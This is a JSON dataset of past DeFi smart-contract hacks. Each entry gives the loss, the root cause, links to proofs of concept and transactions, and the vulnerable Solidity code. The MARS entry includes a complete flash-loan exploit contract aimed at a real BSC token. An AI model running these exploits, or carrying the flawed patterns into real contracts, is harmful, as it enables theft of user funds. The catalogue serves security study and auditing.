[
    {
        "type": "Dex/AMM, Insufficient validation, Reentrancy",
        "date": "20211221",
        "title": "Visor Finance",
        "root_cause": "Insufficient validation & Reentrancy",
        "lost": "$8.2 M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20211221-visor-finance---reentrancy",
        "vulnerable_code_snippet": "// @param visr Amount of VISR transfered from sender to Hypervisor\n// @param to Address to which liquidity tokens are minted\n// @param from Address from which tokens are transferred\n// @return shares Quantity of liquidity tokens minted as a result of deposit\nfunction deposit(\n    uint256 visrDeposit,\n    address payable from,\n    address to\n) external returns (uint256 shares) {\n    require(visrDeposit > 0, \"deposits must be nonzero\");\n    require(to != address(0) && to != address(this), \"to\");\n    require(from != address(0) && from != address(this), \"from\");\n\n    shares = visrDeposit;\n    if (vvisr.totalSupply() != 0) {\n      uint256 visrBalance = visr.balanceOf(address(this));\n      shares = shares.mul(vvisr.totalSupply()).div(visrBalance);\n    }\n\n    if(isContract(from)) {\n      require(IVisor(from).owner() == msg.sender);  **//vulnerable point**\n      IVisor(from).delegatedTransferERC20(address(visr), address(this), visrDeposit);\n    }\n    else {\n      visr.safeTransferFrom(from, address(this), visrDeposit);\n    }\n\n    vvisr.mint(to, shares);\n}",
        "analysis": "Due to from is controllable, attacker can create a custom contract to return specific owner() to pass the check. Then reenter the deposit function via delegatedTransferERC20 function."
    },
    {
        "type": "Flashloans",
        "date": "20230726",
        "lost": "$150K",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Carson_exp.sol",
        "title": "Carson",
        "root_cause": "The root cause was the attacker repeatedly called the `swapExactTokensForTokensSupportingFeeOnTransferTokens` function in the `0x2bdf...341a` contract (not open-source) through flash loans, swapped for [$BUSD](https://twitter.com/search?q=%24BUSD&src=cashtag_click) and burned [$Carson](https://twitter.com/search?q=%24Carson&src=cashtag_click) in the pair, then repeatedly inflated the price of [$Carson](https://twitter.com/search?q=%24Carson&src=cashtag_click) for profit.",
        "attack_tx": "https://bscscan.com/tx/0x37d921a6bb0ecdd8f1ec918d795f9c354727a3ff6b0dba98a512fceb9662a3ac",
        "analysis": "https://twitter.com/Phalcon_xyz/status/1684503154023448583"
    },
    {
        "type": "Access Control",
        "subType": "ERC4626",
        "date": "20220801",
        "loss": "$1.7M",
        "title": "Reaper Farm",
        "fixed": true,
        "root_cause": "without proper access control, allowing anyone to withdraw anyone else's funds.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220801-reaper-farm---business-logic-flaw--lack-of-access-control-mechanism",
        "vulnerable_code": {
            "contract": "ReaperVaultV2.sol",
            "link": "https://ftmscan.com/address/0xcdA5deA176F2dF95082f4daDb96255Bdb2bc7C7D#code#F1#L323"
        },
        "vulnerable_snippet": "function _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal returns (uint256) { \n        _burn(owner, shares); \n}"
    },
    {
        "type": "Access Control",
        "date": "20240425",
        "title": "NGFS",
        "root_cause": "Access Control",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/NGFS_exp.sol",
        "attack_tx": [
            "https://bscscan.com/tx/0x8ff764dde572928c353716358e271638fa05af54be69f043df72ad9ad054de25",
            "https://app.blocksec.com/explorer/tx/bsc/0x8ff764dde572928c353716358e271638fa05af54be69f043df72ad9ad054de25"
        ],
        "analysis": "https://blog.solidityscan.com/ngfs-token-hack-analysis-7a17f183e6a1",
        "lost": "190K",
        "vulnerable_code_snippet": "function setProxySync(address _addr) external {\n    require(_addr != ZERO, \"ERC20: library to the zero address\");\n    require(_addr != DEAD, \"ERC20: library to the dead address\");\n    require(msg.sender == _uniswapV2Proxy, \"ERC20: uniswapPrivileges\");\n\n    _uniswapV2Library = IPancakeLibrary(_addr);\n    _isExcludedFromFee[_addr] = true;\n}\nfunction reserveMultiSync(address syncAddr, uint256 syncAmount) public { // <-- vulnerable point - public\n    require(_msgSender() == address(_uniswapV2Library), \"ERC20: uniswapPrivileges\");\n    require(syncAddr != address(0), \"ERC20: multiSync address is zero\");\n    require(syncAmount > 0, \"ERC20: multiSync amount equal to zero\");\n    _balances[syncAddr] = _balances[syncAddr].air(syncAmount);\n    _isExcludedFromFee[syncAddr] = true;\n}"
    },
    {
        "type": "Reentrancy",
        "date": "20230809",
        "title": "EarningFram",
        "root_cause": "The attack exploited both reentrancy and a flawed business logic in the share burning process, where withdrawals were processed before shares were burnt.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/EarningFram_exp.sol",
        "attack_tx": "https://etherscan.io/tx/0x6e6e556a5685980317cb2afdb628ed4a845b3cbd1c98bdaffd0561cb2c4790fa",
        "analysis": "https://twitter.com/Phalcon_xyz/status/1689182459269644288",
        "lost": "$286k",
        "vulnerable_code_snippet":"function withdraw(uint256 assets, address receiver) public virtual nonReentrant unPaused returns (uint256 shares) {\n    require(assets != 0, \"ZERO_ASSETS\");\n    require(assets <= maxWithdraw, \"EXCEED_ONE_TIME_MAX_WITHDRAW\");\n\n    // Total Assets amount until now\n    uint256 totalDeposit = convertToAssets(balanceOf(msg.sender));\n\n    require(assets <= totalDeposit, \"EXCEED_TOTAL_DEPOSIT\");\n\n    // Calculate share amount to be burnt\n    shares = (totalSupply() * assets) / totalAssets();\n\n    // Calls Withdraw function on controller\n    (uint256 withdrawn, uint256 fee) = IController(controller).withdraw(assets, receiver);\n\n    require(withdrawn > 0, \"INVALID_WITHDRAWN_SHARES\");\n\n    // Shares could exceed balance of caller\n    if (balanceOf(msg.sender) < shares) shares = balanceOf(msg.sender);\n\n    _burn(msg.sender, shares);\n\n    emit Withdraw(address(asset), msg.sender, receiver, assets, shares, fee);\n}"
    },
    {
        "type": "ERC20, Flashloans, claimTokens",
        "date": "20220517",
        "lost": "$1.1 million",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220517-apecoin-ape---flashloan",
        "title": "ApeCoin",
        "root_cause": "Incorrect airdrop calculation",
        "vulnerable_code_snippet": "function claimTokens() external whenNotPaused {\n        require(block.timestamp >= claimStartTime && block.timestamp < claimStartTime + claimDuration, \"Claimable period is finished\");\n        require((beta.balanceOf(msg.sender) > 0 || alpha.balanceOf(msg.sender) > 0), \"Nothing to claim\");\n\n        uint256 tokensToClaim;\n        uint256 gammaToBeClaim;\n\n        (tokensToClaim, gammaToBeClaim) = getClaimableTokenAmountAndGammaToClaim(msg.sender); //vulnerable point, check reward\n\n        for(uint256 i; i < alpha.balanceOf(msg.sender); ++i) {\n            uint256 tokenId = alpha.tokenOfOwnerByIndex(msg.sender, i);\n            if(!alphaClaimed[tokenId]) {\n                alphaClaimed[tokenId] = true;\n                emit AlphaClaimed(tokenId, msg.sender, block.timestamp);\n            }\n        }\nfunction getClaimableTokenAmountAndGammaToClaim(address _account) private view returns (uint256, uint256)\n    {\n        uint256 unclaimedAlphaBalance;\n        for(uint256 i; i < alpha.balanceOf(_account); ++i) {\n            uint256 tokenId = alpha.tokenOfOwnerByIndex(_account, i);\n            if(!alphaClaimed[tokenId]) {\n                ++unclaimedAlphaBalance;\n            }",
        "analysis": "function getClaimableTokenAmountAndGammaToClaim() to calculate the amount of ApeCoin to claim based on how many NFT the caller has and it doesn't consider how long the caller owns those NFTs.\n\n"
    },
    {
        "type": "Aggregation, Bridge, CrossChain",
        "date": "20220320",
        "title": "Li.Fi",
        "lost": "$570 K",
        "root_cause": "Arbitrary call via swap",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220320-lifi---bridges",
        "vulnerable_code_snippet": "function swap(bytes32 transactionId, SwapData calldata _swapData) internal {\n    uint256 fromAmount = _swapData.fromAmount;\n    uint256 toAmount = LibAsset.getOwnBalance(_swapData.receivingAssetId);\n    address fromAssetId = _swapData.sendingAssetId;\n    if (!LibAsset.isNativeAsset(fromAssetId) && LibAsset.getOwnBalance(fromAssetId) < fromAmount) {\n        LibAsset.transferFromERC20(_swapData.sendingAssetId, msg.sender, address(this), fromAmount);\n    }\n\n    if (!LibAsset.isNativeAsset(fromAssetId)) {\n        LibAsset.approveERC20(IERC20(fromAssetId), _swapData.approveTo, fromAmount);\n    }\n\n    // solhint-disable-next-line avoid-low-level-calls\n    (bool success, bytes memory res) = _swapData.callTo.call{ value: msg.value }(_swapData.callData); //vulnerable point\n    if (!success) {\n        string memory reason = LibUtil.getRevertMsg(res);\n        revert(reason);\n    }\n\n    toAmount = LibAsset.getOwnBalance(_swapData.receivingAssetId) - toAmount;\n    emit AssetSwapped(\n        transactionId,\n        _swapData.callTo,\n        _swapData.sendingAssetId,\n        _swapData.receivingAssetId,\n        fromAmount,\n        toAmount,\n        block.timestamp\n    );\n}",
        "analysis": "_swapData is controllable"
    },
    {
        "type": "Arbitrary call, MEV",
        "date": "20220928",
        "title": "MEVBOT - Badc0de",
        "root_cause": "Arbitrary call via callFunction",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220928-MEVBOT---Badc0de",
        "analysis": "In this case dYdX called \"callFunction\" on 0xbad.\nUnfortunately for 0xbad, their code allowed for arbitrary execution.",
        "vulnerable_code": "[https://etherscan.io/address/0xbadc0defafcf6d4239bdf0b66da4d7bd36fcf05a#code]"
    },
    {
        "type": "uninitialized",
        "date": "20240430",
        "lost": "1.4M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/PikeFinance_exp.sol",
        "title": "PikeFinance",
        "root_cause": "uninitialized proxy",
        "vulnerable_code_snippet": "function initialize(\n    address _console, \n    address _rng, \n    address _vault, \n    address _gameProvider, \n    uint16 _minPos, \n    uint16 _maxPos\n) public nonPayable {\n    require(msg.data.length - 4 >= 192);\n    v0 = v1 = !stor_b_2_2;\n    if (!stor_b_2_2) {\n        v0 = v2 = !stor_b_1_1;\n    }\n    if (!v0) {\n        v0 = v3 = !this.code.size;\n        if (!bool(this.code.size)) {\n            v0 = 1 = stor_b_1_1;\n        }\n    }\n\n    require(v0, Error(\"Initializable: contract is already initialized\"));\n    stor_b_1_1 = 1;\n    if (!stor_b_2_2) {\n        stor_b_2_2 = 1;\n    }\n\n    _gateway = _console;\n    owner_2_0_19 = _rng;\n    _endpoint = _vault;\n    stor_4_0_19 = _gameProvider;\n    _isActive = 0x1 | (bytes31(msg.sender << 40) | 0xffffffffffffffffffffffffffffffffffffffffff0000ffffff00 & (_maxPos << 24 | 0xffffffffffffffffffffffffffffffffffffffffff0000ffffff00 & _minPos << 8 | _isActive & 0xffffffffffffffffffffffffffffffffffffffffff0000000f));\n    _nativeAsset = 0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee;\n    if (!stor_b_2_2) {\n        stor_b_2_2 = 0;\n        emit Initialized(1);\n    }\n}",
        "vulnerable_code": "https://etherscan.io/address/0xfc7599cffea9de127a9f9c748ccb451a34d2f063#code",
        "attack_tx": [
            "https://etherscan.io/tx/0xe2912b8bf34d561983f2ae95f34e33ecc7792a2905a3e317fcc98052bce66431",
            "https://app.blocksec.com/explorer/tx/eth/0xe2912b8bf34d561983f2ae95f34e33ecc7792a2905a3e317fcc98052bce66431"
        ],
        "analysis": [
            "https://blog.solidityscan.com/pike-finance-hack-analysis-30bcca9f072b",
            "https://quillaudits.medium.com/decoding-pike-finance-exploit-quillaudits-40a1662d3f8a"
        ]
    },
    {
        "type": "Flashloans",
        "date": "20221107",
        "lost": "$140k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/MooCAKECTX_exp.sol",
        "title": "MooCAKECTX",
        "root_cause": "The reward calculation on the victim contract is not time-related, and the attacker bypasses the `isContract` validation by performing an attack in the constructor.",
        "vulnerable_code_snippet": "/**\n     * @dev Core function of the strat, in charge of collecting and re-investing rewards.\n     * 1. It claims rewards from the MasterChef & SmartChef\n     * 2. It swaps the {output} token for {cake}\n     * 3. It charges the system fee and sends it to BIFI stakers.\n     * 4. It re-invests the remaining profits.\n     */\n    function harvest() public {\n        require(!Address.isContract(msg.sender), \"!contract\");\n        IMasterChef(masterchef).leaveStaking(0);\n        ISmartChef(smartchef).deposit(0);\n        doswap();\n        dosplit();\n        deposit();\n    }",
        "vulnerable_code": [
            "https://bscscan.com/address/0x489afbaed0ea796712c9a6d366c16ca3876d8184#code",
            "https://bscscan.com/address/0xc2562dd7e4caee53df0f9cd7d4dddaa53bcd3d9b#code"
        ],
        "attack_tx": "https://bscscan.com/tx/0x03d363462519029cf9a544d44046cad0c7e64c5fb1f2adf5dd5438a9a0d2ec8e",
        "analysis": [
            "https://twitter.com/BeosinAlert/status/1589501207181393920",
            "https://twitter.com/CertiKAlert/status/1589428153591615488"
        ]
    },
    {
        "type": "Business Logic Flaw",
        "date": "20240416",
        "title": "MARS",
        "root_cause": "The pair contract can get reflections from taxes. Thus the attacker can user flashloan to repeated swap and sync for better pricing.",
        "vulnerable_code": "https://bscscan.com/address/0x436D3629888B50127EC4947D54Bb0aB1120962A0#code",
        "attack_tx": [
            "https://app.blocksec.com/explorer/tx/bsc/0x25e2af0a55581d5629a933af9fedd3c70e6d0c320f0b72700ca80e5cdd36c80b",
            "https://app.blocksec.com/explorer/tx/bsc/0x25e2af0a55581d5629a933af9fedd3c70e6d0c320f0b72700ca80e5cdd36c80b"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/MARS_exp.sol",
        "analysis": "https://x.com/Phalcon_xyz/status/1780150315603701933",
        "vulnerable_code_snippet": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.17;\n\nimport \"forge-std/Test.sol\";\nimport \"../interface.sol\";\n\n// Total Lost: >$100k\n// Attacker: 0x306174b707ebf6d7301a0bcd898ae1666ec176ae\n// Attack Contract: 0x797acb321cb10154aa807fcd1e155c34135483cd\n// Attack Contract: 0x797acb321cb10154aa807fcd1e155c34135483cd\n// Vulnerable Contract: 0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943\n// Attack Tx: https://app.blocksec.com/explorer/tx/bsc/0x25e2af0a55581d5629a933af9fedd3c70e6d0c320f0b72700ca80e5cdd36c80b\n\n// @Analyses\n// https://twitter.com/Phalcon_xyz/status/1780150315603701933\n// The pair contract can get reflections from taxes. Thus the attacker can user flashloan to repeated swap and sync for better pricing.\n\n\nIPancakeV3Pool constant v3pair = IPancakeV3Pool(0x36696169C63e42cd08ce11f5deeBbCeBae652050);\nIERC20 constant bnb = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\nIPancakeRouter constant router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\nIERC20 constant MARS = IERC20(0x436D3629888B50127EC4947D54Bb0aB1120962A0);\n\ncontract MARS_EXP is Test {\n\n    uint lending_amount = 350 ether;\n\n    function setUp() public {\n        vm.createSelectFork(\"bsc\", 37903299); // fork BSC at block 37903299\n    }\n\n    function testExploit_MARS() public {\n\n        v3pair.flash(address(this),0,lending_amount, \"\");\n    }\n\n    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata) external {\n        emit log_named_uint(\"WBNB balance before Attack\", bnb.balanceOf(address(this)) / 1 ether);\n        \n        emit log_string(\"Buying MARS with WBNB\");\n        bnb.approve(address(router), 2**256-1);\n        MARS.approve(address(router), 2**256-1);\n\n        address;\n        path[0] = address(bnb);\n        path[1] = address(MARS);\n\n        for (uint i =0; ;){\n            if (bnb.balanceOf(address(this)) == 0) {\n                break;\n            }\n            uint tobuy = router.getAmountsIn(1000 ether, path)[0];\n            TokenReceiver receiver = new TokenReceiver();\n            if (bnb.balanceOf(address(this)) > tobuy) {\n                router.swapExactTokensForTokensSupportingFeeOnTransferTokens(tobuy, 0, path, address(receiver), block.timestamp+1);\n                // emit log_named_uint(\"get MARS\", MARS.balanceOf(address(receiver)));\n                MARS.transferFrom(address(receiver),address(this),MARS.balanceOf(address(receiver)));\n            }else{\n                router.swapExactTokensForTokensSupportingFeeOnTransferTokens(bnb.balanceOf(address(this)), 0, path, address(receiver), block.timestamp+1);\n                // emit log_named_uint(\"get MARS\", MARS.balanceOf(address(receiver)));\n                MARS.transferFrom(address(receiver),address(this),MARS.balanceOf(address(receiver)));\n                break;\n            }\n        }\n        \n        emit log_named_uint(\"MARS After buying\", MARS.balanceOf(address(this)) / 1 ether);\n        emit log_named_uint(\"BNB After buying\", bnb.balanceOf(address(this)) / 1 ether);\n\n        path[0] = address(MARS);\n        path[1] = address(bnb);\n        for (uint i = 0; ;){\n            if (MARS.balanceOf(address(this)) == 0) {\n                break;\n            }            \n            if (MARS.balanceOf(address(this)) > 1000 ether) {\n                router.swapExactTokensForTokensSupportingFeeOnTransferTokens(1000 ether, 0, path, address(this), block.timestamp+1);\n            }else{\n                router.swapExactTokensForTokensSupportingFeeOnTransferTokens(MARS.balanceOf(address(this)), 0, path, address(this), block.timestamp+1);\n                break;\n            }\n        }\n        \n        emit log_named_uint(\"WBNB balance After Attack\", bnb.balanceOf(address(this)) / 1 ether);\n        emit log_named_uint(\"MARS After Attack\", MARS.balanceOf(address(this)) / 1 ether);\n        \n        bnb.transfer(msg.sender,lending_amount + fee1);\n        emit log_named_uint(\"WBNB balance After Paying back\", bnb.balanceOf(address(this)) / 1 ether);\n\n    }\n\n}\n\ncontract TokenReceiver {\n    constructor() {\n        MARS.approve(msg.sender,2**256-1);\n    }\n}\n"
    },
    {
        "type": "Insufficient validation",
        "date": "20230818",
        "title": "ExactlyProtocol",
        "root_cause": "The root cause was the public leverage() function in the DebtManager contract of Exactly Protocol. This function was missing proper input validation. The attacker exploited this vulnerability by passing in an invalid market address when using the leverage() function and created a UniswapV3 liquidity position with WETH and a fake token. Due to the lack of input validation, the attacker could manipulate the _msgSender parameter to target victim addresses and drain their funds.",
        "attack_tx": "https://optimistic.etherscan.io/tx/0x3d6367de5c191204b44b8a5cf975f257472087a9aadc59b5d744ffdef33a520e",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/Exactly_exp.sol",
        "analysis": [
            "https://medium.com/@exactly_protocol/exactly-protocol-incident-post-mortem-b4293d97e3ed",
            "https://twitter.com/BlockSecTeam/status/1692533280971936059"
        ],
        "lost": "$7M",
        "Vulnerable_code_snippet":"function leverage(\n    Market market,\n    uint256 deposit,\n    uint256 ratio,\n    uint256 borrowAssets,\n    Permit calldata marketPermit,\n    Permit calldata assetPermit\n  ) external permit(market, borrowAssets, marketPermit) permit(market.asset(), deposit, assetPermit) {\n    leverage(market, deposit, ratio);\n  }"
    },
    {
        "type": "ERC20, Miscalculation",
        "date": "20220910",
        "title": "DPC",
        "root_cause": "Incorrect Reward calculation",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220910-dpc---Incorrect-Reward-calculation",
        "analysis": "To increase the reward by calling the claimStakeLp function in the contract. The reward calculated in the function claimStakeLp() is the accumulation of the previous reward and the reward calculated by getClaimQuota().\n\nVulnerable code snippet:\n[https://bscscan.com/address/0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE#code#L1232](https://bscscan.com/address/0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE#code#L1232)\n\n```solidity\nfunction claimStakeLp(address _from ,uint256 Amountwei) public {\n                require(Amountwei > 0,\"Quantity error\");\n                require(_from==msg.sender,\"error\");\n                require(dpcLp[_from] >= Amountwei ,\n\"Insufficient authorization limit\");\n                IERC20(LpContract).transfer(_from,Amountwei);\n\n                oldClaimQuota[_from] = oldClaimQuota[_from].add(getClaimQuota(_from)); //vulnerable point\n\n                dpcLp[_from] = dpcLp[_from].sub(Amountwei);\n\n                time=currTimeStamp();\n                dpcLpTime[_from] = time;\n\n                dpcLpTotal = dpcLpTotal.sub(Amountwei);\n        \n         }\n\nfunction getClaimQuota(address addr) public view returns (uint256) {\n                uint256 ClaimQuota;\n               if(dpcAirdrop[addr] > 0 && dpcLp[addr]>0){\n                    uint256 QuotastartTime;\n                    uint256 limit = 50 * 10**18;\n                    uint256 LpQuotaNum = dpcLp[addr].mul(getLpPrice()).mul(lpQuota).div(100);\n                    uint256 secondQuota;\n                    if(getDpcPrice()>0){\n                        secondQuota = LpQuotaNum.div(24*60*60).div(getDpcPrice());\n                    }\n\n                    uint256 limitSecondQuota = limit.div(24*60*60);\n                    if(secondQuota > limitSecondQuota){\n                        secondQuota = limitSecondQuota;\n                    }\n                    uint256 nowTime = currTimeStamp();\n\n                    if(dpcLpTime[addr]>ClaimQuotaTime[addr]){\n                        QuotastartTime = dpcLpTime[addr];\n                    }else{\n                        QuotastartTime = ClaimQuotaTime[addr];\n                    }\n                    ClaimQuota = (nowTime.sub(QuotastartTime)).mul(secondQuota);\n                    if(ClaimQuota > dpcAirdrop[addr]){\n                        ClaimQuota = dpcAirdrop[addr];\n                    }\n               }else{\n                    ClaimQuota = 0;\n               }\n               ClaimQuota = ClaimQuota.add(oldClaimQuota[addr]); //vulnerable point\n\n               return ClaimQuota;\n        \n         }\n```",
        "Lost": "$1.4 M",
        "vulnerable_code_snippet":"function claimStakeLp(address _from ,uint256 Amountwei) public {\n    require(Amountwei > 0,\"Quantity error\");\n    require(_from==msg.sender,\"error\");\n    require(dpcLp[_from] >= Amountwei ,\"Insufficient authorization limit\");\n    IERC20(LpContract).transfer(_from,Amountwei);\n\n    oldClaimQuota[_from] = oldClaimQuota[_from].add(getClaimQuota(_from)); //vulnerable point\n\n    dpcLp[_from] = dpcLp[_from].sub(Amountwei);\n\n    time=currTimeStamp();\n    dpcLpTime[_from] = time;\n\n    dpcLpTotal = dpcLpTotal.sub(Amountwei);\n}\n\nfunction getClaimQuota(address addr) public view returns (uint256) {\n    uint256 ClaimQuota;\n    if(dpcAirdrop[addr] > 0 && dpcLp[addr]>0){\n        uint256 QuotastartTime;\n        uint256 limit = 50 * 10**18;\n        uint256 LpQuotaNum = dpcLp[addr].mul(getLpPrice()).mul(lpQuota).div(100);\n        uint256 secondQuota;\n        if(getDpcPrice()>0){\n            secondQuota = LpQuotaNum.div(24*60*60).div(getDpcPrice());\n        }\n\n        uint256 limitSecondQuota = limit.div(24*60*60);\n        if(secondQuota > limitSecondQuota){\n            secondQuota = limitSecondQuota;\n        }\n        uint256 nowTime = currTimeStamp();\n\n        if(dpcLpTime[addr]>ClaimQuotaTime[addr]){\n            QuotastartTime = dpcLpTime[addr];\n        }else{\n            QuotastartTime = ClaimQuotaTime[addr];\n        }\n        ClaimQuota = (nowTime.sub(QuotastartTime)).mul(secondQuota);\n        if(ClaimQuota > dpcAirdrop[addr]){\n            ClaimQuota = dpcAirdrop[addr];\n        }\n    }else{\n        ClaimQuota = 0;\n    }\n    ClaimQuota = ClaimQuota.add(oldClaimQuota[addr]); //vulnerable point\n\n    return ClaimQuota;\n}"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20240608",
        "lost": "$28K",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/YYS_exp.sol",
        "title": "YYStoken",
        "root_cause": "Root cause is the same as STM token exploit, wrong calculation of liquidity amount to remove in \"sell\" function.",
        "vulnerable_code": "https://bscscan.com/address/0xcC0F0f41f4c4c17493517dd6c6d9DD1aDb134Fc9#code",
        "attack_tx": "https://app.blocksec.com/explorer/tx/bsc/0x397a09af6494c0bfcd89e010f5dd65d90f3ee1cf1ff813ce5b0c1d42a1c8dec9",
        "analysis": "https://x.com/0xNickLFranklin/status/1799610045589831833",
        "vulnerable_code_snippet":"function sell(uint256 amount) external {\n    eve_token_erc20.transferFrom(msg.sender, address(this), amount);\n    (, uint256 r1, ) = inner_pair.getReserves();  // <-- vulnerable point\n    uint256 lpAmount = amount*inner_pair.totalSupply()/(2*r1);\n    uniswapV2Router.removeLiquidity(address(usdt_token_erc20),address(eve_token_erc20),lpAmount,0,0,msg.sender,block.timestamp);\n}"
    },
    {
        "type": "Incorrect logic",
        "date": "20221213",
        "lost": "$845k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/ElasticSwap_exp.sol",
        "title": "ElasticSwap",
        "root_cause": "Business Logic Flaw. \nElasticSwap is an AMM focused on elastic supply tokens.\nAn elastic supply (or rebase) token works in a way that the circulating supply expands or contracts due to changes in token price.\nElasticSwap adapts to the elastic supply changes without the need for someone to call a function on the pool itself after a change (rebase) happens.",
        "attack_tx": "https://explorer.phalcon.xyz/tx/eth/0xb36486f032a450782d5d2fac118ea90a6d3b08cac3409d949c59b43bcd6dbb8f",
        "analysis": "https://quillaudits.medium.com/decoding-elastic-swaps-850k-exploit-quillaudits-9ceb7fcd8d1a",
        "vulnerable_code_snippet":"function addLiquidity(uint256 _baseTokenQtyDesired, uint256 _quoteTokenQtyDesired, uint256 _baseTokenQtyMin, uint256 _quoteTokenQtyMin, address _liquidityTokenRecipient){//vulnerable point\n    MathLib.TokenQtys memory tokenQtys = MathLib.calculateAddLiquidityQuantities(, , , , IERC20(baseToken).balanceOf(address(this)), totalSupply, internalBalances);\n    internalBalances.kLast = internalBalances.baseTokenReserveQty * internalBalances.quoteTokenReserveQty;\n}\n\nfunction removeLiquidity(uint256 _liquidityTokenQty, uint256 _baseTokenQtyMin, uint256 _quoteTokenQtyMin, address _tokenRecipient){//vulnerable point\n    uint256 baseTokenReserveQty  = IERC20(baseToken).balanceOf(address(this));\n    uint256 quoteTokenReserveQty = IERC20(quoteToken).balanceOf(address(this));\n    \n    uint256 baseTokenQtyToReturn  = (_liquidityTokenQty * baseTokenReserveQty) / totalSupplyOfLiquidityTokens;\n    uint256 quoteTokenQtyToReturn = (_liquidityTokenQty * quoteTokenReserveQty) / totalSupplyOfLiquidityTokens;\n\n    uint256 internalBaseTokenReserveQty = internalBalances.baseTokenReserveQty;\n    uint256 baseTokenQtyToRemoveFromInternalAccounting = (_liquidityTokenQty * internalBaseTokenReserveQty) / totalSupplyOfLiquidityTokens;\n    \n    internalBalances.baseTokenReserveQty = internalBaseTokenReserveQty = internalBaseTokenReserveQty - baseTokenQtyToRemoveFromInternalAccounting;\n    \n    internalBalances.quoteTokenReserveQty = internalQuoteTokenReserveQty = internalQuoteTokenReserveQty - quoteTokenQtyToReturn;  // @audit: doesn't sync the reserves (as in UniswapPair.burn())\n    \n    IERC20(baseToken).safeTransfer(_tokenRecipient, baseTokenQtyToReturn);\n    IERC20(quoteToken).safeTransfer(_tokenRecipient, quoteTokenQtyToReturn);\n}"
    },
    {
        "type": "Sandwich",
        "date": "20230503",
        "lost": "$74K",
        "title": "NeverFall",
        "root_cause": "The root cause lies in the logic that evaluates the price of the token, which is based on the Pair from PancakeSwap. If you examine the sell() function of the NeverFall contract, you can easily identify the cause.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/NeverFall_exp.sol",
        "attack_tx": "https://bscscan.com/address/0x5ABDe8B434133C98c36F4B21476791D95D888bF5#contracts",
        "analysis": [
            "https://twitter.com/BeosinAlert/status/1653619782317662211",
            "https://twitter.com/kalos_security/status/1668092312906514433"
        ],
        "vulnerable_code_snippet":"function buy(uint256 amountU) public returns(uint256){\n    require(startBuy,\"not start\");\n    //收usdt\n    IERC20(usdtAddress).safeTransferFrom(msg.sender,address(this),amountU);\n\n    uint256 beforeLiquidityAmount = balanceOf(address(this));\n    //90%加池子\n    IERC20(usdtAddress).approve(uniswapV2Router,amountU);\n    addLiquidity(initSupply, amountU * buyAddLiqFee / 100);\n    uint256 afterLiquidityAmount = balanceOf(address(this));\n    //5%的usdt购买\n    buySwap(amountU * buySwapFee / 100);\n    super._transfer(address(this), msg.sender, beforeLiquidityAmount - afterLiquidityAmount - balanceOf(pairTempAddress)); \n    super._transfer(pairTempAddress, address(this), balanceOf(pairTempAddress));\n    //营销\n    IERC20(usdtAddress).safeTransfer(marketingAddress,amountU * buyMarketingFee / 100);\n    emit BuyNF(msg.sender,amountU);\n    return beforeLiquidityAmount - afterLiquidityAmount - balanceOf(pairTempAddress);\n} \n\nfunction sell(uint256 amount) public returns(uint256){\n    super._transfer(msg.sender, address(this), amount);\n    //撤池子 退给用户U\n    uint256 balanceNF = this.balanceOf(uniswapV2Pair);\n    uint256 pairTotalSupply = IERC20(uniswapV2Pair).totalSupply();\n    uint256 needLiquidity = amount * pairTotalSupply / balanceNF; //vulnerable point\n    \n    uint256 beforeU = IERC20(usdtAddress).balanceOf(address(this));\n    removeLiquidity(needLiquidity,amount * 90 / 100,0);\n    uint256 afterU = IERC20(usdtAddress).balanceOf(address(this));\n    uint256 outU =  afterU - beforeU;\n\n    IERC20(usdtAddress).safeTransfer(msg.sender, outU * sellFee / 100);\n    //营销\n    IERC20(usdtAddress).safeTransfer(marketingAddress,outU * sellMarketingFee / 100);\n    emit SellNF(msg.sender,amount,outU);\n    return outU * sellFee / 100;\n}"
    },
    {
        "type": "Incorrect logic",
        "date": "20221129",
        "title": "SEAMAN",
        "root_cause": "Business Logic Flaw",
        "lost": "$7k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/SEAMAN_exp.sol",
        "attack_tx": "https://explorer.phalcon.xyz/tx/bsc/0x6f1af27d08b10caa7e96ec3d580bf39e29fd5ece00abda7d8955715403bf34a8",
        "analysis": [
            "https://twitter.com/CertiKAlert/status/1597513374841044993",
            "https://twitter.com/BeosinAlert/status/1597535796621631489"
        ],
